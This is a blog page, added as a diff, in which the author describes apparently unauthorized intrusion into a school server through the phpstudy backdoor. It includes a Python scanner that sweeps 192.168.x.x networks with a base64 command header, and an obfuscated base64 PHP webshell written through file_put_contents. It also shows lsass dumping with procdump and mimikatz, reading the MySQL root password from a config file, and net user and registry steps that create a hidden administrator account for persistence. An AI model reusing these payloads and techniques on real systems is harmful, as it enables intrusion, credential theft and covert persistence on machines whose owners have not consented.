@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    记一次phpstudy后门引发的渗透测试 | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  渗透测试
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 42 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 22 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1569909600000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1569909600000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>记一次phpstudy后门引发的渗透测试</h1>
+    <p>本文首发于先知社区 <a href="https://xz.aliyun.com/t/6563" target="_blank" rel="noopener">https://xz.aliyun.com/t/6563</a></p>
+<p>前段时间 phpstudy 被爆出存在后门，想到学校里的许多站都是用 phpstudy 做的环境，于是写了个脚本扫描了下，发现真的有中招的</p>
+<h2 id="phpstudy-后门扫描"><a href="#phpstudy-后门扫描" class="headerlink" title="phpstudy 后门扫描"></a>phpstudy 后门扫描</h2><p>写了个简单的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># f = open("ip.txt",'w')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(ip)</span>:</span></span><br><span class="line">    url = <span class="string">"http://&#123;&#125;:80/index.php"</span>.format(ip)</span><br><span class="line">    headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6"</span>, <span class="string">"Accept-Charset"</span>: <span class="string">"ZWNobyAiZGFvbGd0cyI7"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"daolgts"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            <span class="comment"># f.write(ip+"\n")</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] found\t"</span>+ip</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">            <span class="comment"># print "[-] nope\t"+ip</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># print "[-] nope\t"+ip</span></span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] ip :"</span>+_+<span class="string">"next..."</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        ip = <span class="string">"192.168."</span>+str(_)+<span class="string">"."</span>+str(i)</span><br><span class="line">        t=threading.Thread(target=test,args=(ip,))</span><br><span class="line">        thread.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> thread:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>
+
+<p>最后只有一个 ip 能够利用</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>根据 payload 可以执行任意的 php 代码</p>
+<p>先 <code>getcwd()</code> 看下位置</p>
+<p><img src="https://s2.ax1x.com/2019/09/25/uZ760g.png" alt="uZ760g.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getcwd());</span><br><span class="line"></span><br><span class="line">dmFyX2R1bXAoZ2V0Y3dkKCkpOw==</span><br><span class="line"></span><br><span class="line">string(12) &quot;C:\phpStudy2&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(&quot;C:\phpStudy2&quot;));</span><br><span class="line">var_dump(scandir(&quot;C:\phpStudy2\PHPTutorial&quot;));</span><br><span class="line">var_dump(scandir(&quot;C:\phpStudy2\PHPTutorial\WWW&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>找到网站目录 <code>C:\phpStudy2\PHPTutorial\WWW</code></p>
+<p>然后 <code>file_put_contents</code> 写个马 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">"C:\phpStudy2\PHPTutorial\WWW"</span>,base64_decode(<span class="string">"PD9waHAgJGRHcWE9Y3JlYXRlX2Z1bmN0aW9uKGNocig0OTUtNDU5KS5iYXNlNjRfZGVjb2RlKCdjdz09JykuY2hyKDA0MTUtMDIzNikuc3RyX3JvdDEzKCd6JykuY2hyKDUyNzIyLzUyMiksc3RyX3JvdDEzKCdyJykuYmFzZTY0X2RlY29kZSgnZGc9PScpLmNocig5OTktOTAyKS5jaHIoMHhjNzIwLzB4MWQ4KS5iYXNlNjRfZGVjb2RlKCdLQT09JykuY2hyKDAxMDMzLTA3NjcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5jaHIoMHgzMWMtMHgyYWQpLmJhc2U2NF9kZWNvZGUoJ2JRPT0nKS5jaHIoNDUxNDcvNDQ3KS5jaHIoMHg5NjExLzB4M2E5KS5iYXNlNjRfZGVjb2RlKCdPdz09JykpOyRkR3FhKGJhc2U2NF9kZWNvZGUoJ05UTXlNJy4nVE16TzAnLidCbGRrRicuJ3NLQ1JmJy4nJy5jaHIoODI2MjAvOTcyKS5zdHJfcm90MTMoJ1InKS5jaHIoMHhkNi0weDlkKS5zdHJfcm90MTMoJ0cnKS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDB4MmE0LTB4MjVlKS5zdHJfcm90MTMoJ2cnKS5iYXNlNjRfZGVjb2RlKCdVUT09JykuY2hyKDA0NTE0MC8wMzQwKS5jaHIoMHg0ZjZmLzB4MTlmKS4nJy4ncERTSEInLidYVUYwcCcuJ096RTFPJy4nVFl6T1QnLidrNycuJycpKTs/Pg=="</span>));</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了蚁剑的插件生成shell，配合蚁剑连接使用</p>
+<p><img src="https://s2.ax1x.com/2019/09/25/uZ7Mf1.png" alt="uZ7Mf1.png"></p>
+<p><img src="https://s2.ax1x.com/2019/09/25/uZ7KYR.png" alt="uZ7KYR.png"></p>
+<p>成功连接</p>
+<h2 id="继续搞"><a href="#继续搞" class="headerlink" title="继续搞"></a>继续搞</h2><p><img src="https://s2.ax1x.com/2019/09/25/uZHZgP.png" alt="uZHZgP.png"></p>
+<p>emmm，直接就是 administrator 了，也没有内网环境，后来发现是一台虚拟机，枯燥。。</p>
+<p>看下端口</p>
+<p><img src="https://s2.ax1x.com/2019/09/25/uZHB59.png" alt="uZHB59.png"></p>
+<p>发现开启了 <code>3306</code> 和 <code>9833</code>，<code>3306</code> 是 mysql ，这个 <code>9833</code> 应该就是修改了的 <code>3389</code> 的端口</p>
+<p>mysql 的密码在 <code>config.php</code> 中能找到，而且是 root 用户</p>
+<p>使用蚁剑连接，在数据库中发现网站后台的管理员密码</p>
+<p><img src="https://s2.ax1x.com/2019/09/25/uZLT2R.png" alt="uZLT2R.png"></p>
+<p>然后目标转向 <code>9983</code></p>
+<p>kali 下使用 rdesktop 有问题</p>
+<p><img src="https://s2.ax1x.com/2019/09/25/uZb3ZD.png" alt="uZb3ZD.png"></p>
+<p>windows 里 mstsc.exe 可以正常连接</p>
+<p>然后抓下密码，先传个 <code>procdump64.exe</code>，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe 1.dmp</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>1.dmp</code> ，使用 <code>mimikatz.exe</code> 读</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/09/25/uZqWhd.png" alt="uZqWhd.png"></p>
+<p>emmm，不知道为什么抓不到密码，也尝试了传 <code>mimikatz.exe</code> 直接读，同样失败</p>
+<p>既然已经拿到了 administrator 权限，直接添加一个后门用户吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure>
+
+<p>使用该账号密码，成功登录</p>
+<p>用户名后添加 <code>$</code> 在 cmd 里使用 <code>net user</code> 查看时是可以隐藏的，但在图形界面下还是会显示</p>
+<p>接下来操作注册表，使这个账户在图形界面中也不显示</p>
+<p>输入 <code>regedit</code> 打开注册表编辑器，找到 <code>HKEY_LOCAL_MACHINE\SAM\SAM</code>,右键点击权限，将读写权限赋予 <code>administrator</code></p>
+<p><img src="https://s2.ax1x.com/2019/09/26/um3Vat.png" alt="um3Vat.png"></p>
+<p>找到后门用户和 administrator 用户对应的目录</p>
+<p><img src="https://s2.ax1x.com/2019/09/26/umMktO.png" alt="umMktO.png"></p>
+<p>将 administrator 对应目录中的F值复制到后门用户对应目录中的F值</p>
+<p><img src="https://s2.ax1x.com/2019/09/26/umMC0x.png" alt="umMC0x.png"></p>
+<p>复制完成后，把 <code>defaultuser0$</code> 和其对应的 <code>0000003EA</code> 目录导出并保存</p>
+<p>然后删除刚才的后门用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure>
+
+<p>然后重新导入注册表，这样就添加了一个隐藏的用户，使用 <code>defaultuser0$</code> 和密码就能登陆为 administrator</p>
+<p><img src="https://s2.ax1x.com/2019/09/25/uZX9kF.png" alt="uZX9kF.png"></p>
+<h2 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h2><p>发现登着 <code>tim</code> 呢，找到 qq 号，进行亲切友好的交谈</p>
+<p><img src="https://s2.ax1x.com/2019/09/26/umQHiT.png" alt="umQHiT.png"></p>
+<p><img src="https://s2.ax1x.com/2019/09/26/umQToV.png" alt="umQToV.png"></p>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+<script>
+  (function() {
+    var cx = '005157513716557594323:jvii0oiejlb';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+      '//cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
